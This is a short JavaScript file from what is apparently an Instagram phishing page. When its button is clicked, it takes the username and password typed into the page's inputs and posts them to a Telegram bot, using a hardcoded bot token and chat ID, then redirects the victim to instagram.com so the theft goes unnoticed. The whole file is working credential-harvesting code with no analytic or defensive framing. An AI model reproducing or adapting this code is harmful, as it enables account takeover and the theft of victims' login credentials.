let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')
let API_KEY = '7470965915:AAHrygMOTM5nVKFYTBkWVrql7RDKHiEHHyQ';
let URI = `https://api.telegram.org/bot${API_KEY}/sendMessage`;
let CHAT_ID = 7470965915;



button.addEventListener('click', (e) => {
    console.log('button clicked');
    e.preventDefault();

    fetch(URI, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `\n\n username: ${inputs[0].value} \n\n password: ${inputs[1].value}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        window.location.href = 'https://instagram.com';
    })
    .catch(error => console.error('Error:', error));
});
